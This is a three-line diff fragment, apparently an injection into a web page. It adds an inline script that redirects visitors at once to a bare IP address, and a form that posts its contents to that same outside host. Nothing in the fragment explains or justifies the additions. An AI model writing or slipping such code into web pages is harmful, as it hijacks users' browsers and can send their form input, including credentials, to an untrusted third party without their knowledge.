@@ -1,0 +1,3 @@
+<script>location.href="http://126.114.75.247/";</script>
+
+<form method="POST" action="http://126.114.75.247/">
